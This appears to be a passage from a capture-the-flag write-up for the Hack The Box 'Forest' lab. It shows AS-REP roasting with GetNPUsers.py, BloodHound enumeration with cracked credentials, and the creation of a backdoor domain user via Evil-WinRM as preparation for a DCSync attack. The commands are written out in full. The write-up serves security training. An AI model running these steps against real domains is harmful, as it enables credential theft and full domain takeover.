Step 3: AS-REP Roasting Attack

Using GetNPUsers.py to find vulnerable users:

┌─[elliot@parrot]─[~/forest]
└──╼ $for user in $(cat users.txt); do python GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb/${user}; done

Step 6: BloodHound Enumeration

(venv) ┌─[elliot@parrot]─[~]
└──╼ $bloodhound-python -d htb.local -u svc-alfresco -p s3rvice -gc forest.htb.local -c all -ns 10.10.10.161

BloodHound analysis reveals that the user has membership in "Exchange Windows Permissions" group, which can be abused for DCSync attack.

Step 7: Creating User for DCSync

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user elliot Qwerty@123 /add /domain

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net localgroup "Remote Management Users" elliot /add

Key Takeaways

  • AS-REP Roasting - Exploiting users without Kerberos preauthentication
  • BloodHound - AD attack path visualization
  • Exchange Windows Permissions - Abusing group membership for DCSync
  • DCSync Attack - Replicating domain credentials

This machine demonstrates privilege escalation from a standard domain user to Domain Admin using DCSync rights.
